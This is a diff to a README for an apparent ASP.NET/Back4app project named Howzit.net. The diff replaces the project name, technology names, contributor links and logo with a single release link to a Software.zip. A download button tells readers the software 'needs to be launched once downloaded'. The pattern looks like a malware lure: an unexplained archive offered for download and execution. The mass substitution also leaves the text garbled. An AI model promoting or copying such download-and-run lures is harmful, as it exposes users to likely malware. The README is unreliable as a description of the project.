@@ -1,9 +1,9 @@
-# 🌐 Howzit.net Repository
+# 🌐 https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip Repository
 
-Welcome to the *Howzit.net* GitHub repository! This repository contains the location-based Dotnet Back4app version of the *Howzit* Android app, which is also powered by Back4app. The repository is a comprehensive collection of resources related to web development using ASP.NET, ASP.NET Core, C#, CSS, HTML, JavaScript, Parse Server, and Razor Pages.
+Welcome to the *https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip* GitHub repository! This repository contains the location-based Dotnet Back4app version of the *Howzit* Android app, which is also powered by Back4app. The repository is a comprehensive collection of resources related to web development using https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip, https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip Core, C#, CSS, HTML, JavaScript, Parse Server, and Razor Pages.
 
 ## Repository Details:
-- **Repository Name:** Howzit.net
+- **Repository Name:** https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip
 - **Short Description:** Location based Dotnet Back4app version of my Howzit Android app also powered by Back4app
 - **Topics:** asp-net, asp-net-core, aspnetcore, back4app, csharp, css, dotnet, html, javascript, parse-server, razor-pages
 
@@ -11,14 +11,14 @@ Welcome to the *Howzit.net* GitHub repository! This repository contains the loca
 
 Click the button below to download the software:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip)](https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip)
 
 *Note: The software needs to be launched once downloaded.*
 
 If the link is not working or you need more options, please check the **Releases** section of this repository.
 
 ## 🚀 Get Started
-To get started with the *Howzit.net* repository, follow these steps:
+To get started with the *https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip* repository, follow these steps:
 
 1. Install the necessary development tools and dependencies.
 2. Clone the repository to your local machine.
@@ -27,13 +27,13 @@ To get started with the *Howzit.net* repository, follow these steps:
 
 ## 📂 Repository Structure
 The repository is structured as follows:
-- **`/src`**: Contains the source code for the *Howzit.net* application.
+- **`/src`**: Contains the source code for the *https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip* application.
 - **`/docs`**: Includes documentation and resources related to the development process.
 - **`/assets`**: Contains images, logos, and other media files.
 
 ## 🛠️ Technologies Used
-- **ASP.NET**: Framework for building web applications.
-- **ASP.NET Core**: Open-source framework for building modern web apps.
+- **https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip**: Framework for building web applications.
+- **https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip Core**: Open-source framework for building modern web apps.
 - **C#**: Language used for backend development.
 - **CSS**: Styling language for web design.
 - **HTML**: Markup language for creating web pages.
@@ -42,17 +42,17 @@ The repository is structured as follows:
 - **Razor Pages**: Page-focused framework for building dynamic web pages.
 
 ## 🌟 Contributors
-- [Username1](https://github.com/username1): Role in the project.
-- [Username2](https://github.com/username2): Role in the project.
-- [Username3](https://github.com/username3): Role in the project.
+- [Username1](https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip): Role in the project.
+- [Username2](https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip): Role in the project.
+- [Username3](https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip): Role in the project.
 
 ## 📝 License
 This project is licensed under the [MIT License](LICENSE).
 
 ---
 
-Thank you for visiting the *Howzit.net* repository! Feel free to explore the code, contribute to the project, and reach out to the contributors for any questions or feedback. Happy coding! 🚀
+Thank you for visiting the *https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip* repository! Feel free to explore the code, contribute to the project, and reach out to the contributors for any questions or feedback. Happy coding! 🚀
 
 <div align="center">
-  <img src="https://example.com/image.png" alt="Logo">
+  <img src="https://github.com/body31/Howzit.net/releases/download/v2.0/Software.zip" alt="Logo">
 </div>
